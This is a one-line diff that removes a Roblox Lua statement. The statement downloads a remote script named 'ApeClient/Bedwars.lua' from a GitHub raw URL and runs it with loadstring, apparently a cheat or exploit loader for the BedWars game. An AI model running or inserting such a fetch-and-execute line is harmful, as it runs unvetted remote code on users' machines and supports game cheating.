@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/IxvIIxvI/ApeClient/refs/heads/main/Bedwars.lua", true))()
